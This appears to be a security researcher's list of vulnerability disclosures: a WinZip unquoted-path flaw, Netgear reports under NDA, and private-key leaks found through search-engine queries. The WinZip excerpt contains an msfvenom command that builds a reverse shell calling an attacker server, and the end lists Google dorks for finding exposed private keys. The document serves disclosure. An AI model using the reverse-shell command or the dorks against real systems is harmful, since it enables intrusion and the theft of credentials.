## Vulnerability Disclosures:
### Unquoted Path Vulnerability: 3 Reported
1. Corel (Winzip): [https://github.com/ciwen3/Public/blob/master/vuln-report/winzip-Submission.pdf](https://github.com/ciwen3/Public/blob/master/Cyber%20Security/vuln-report/winzip-Submission.pdf)
- Credited: [https://support.corel.com/hc/en-us/articles/217086227](https://web.archive.org/web/20210218194953/https://support.corel.com/hc/en-us/articles/217086227)
- ```This Vulnerability would not compromise the WinZip application. It would however compromise WinZips customer devices. This attack would mostly be used for maintaining persistence or elevating privilege's on an already compromised machine. This is a security issue because no one wants unintended programs to be run by the system. For this vulnerability to work it would require a malicious application named program.exe to be stored in the C:\ folder. Once there, the malicious application could do anything you programmed it to. The easiest way to illustrate this would be a terminal connection to a remote server giving someone else control of the system. For this example I can use MSFVenom to easily make a reverse shell that calls home to my AWS Command and Control server. "msfvenom p windows/shell_reverse_tcp LHOST=[AWS-IP] LPORT=4444 -f exe > Program.exe" Then I can place this executable in C:\ folder. When the WinZip calls an unquoted path that begins with C:\Program Files… it will run the malicious program.exe application and give me the full permissions being used by the WinZip application.```
2. Netgear PSV-2020-0590: Non-Disclosure Agreement 
3. Netgear PSV-2020-0593: Non-Disclosure Agreement 

### Sensitive Data Leak Disclosures: Multiple Reported (lost track of the actual count)
usually found using google dorks and related to .pem .key or api keys

1. Weathernews Inc (wni.co.jp): May 13, 2021 - Sensitive data exposure, found private keys on several publicly accessable (no login required and google searchable) servers.

##### Examples:
- intitle:"index of" "*.cert.pem" | "*.key.pem"
- "BEGIN * PRIVATE KEY" ext:pem | ext:key | ext:txt
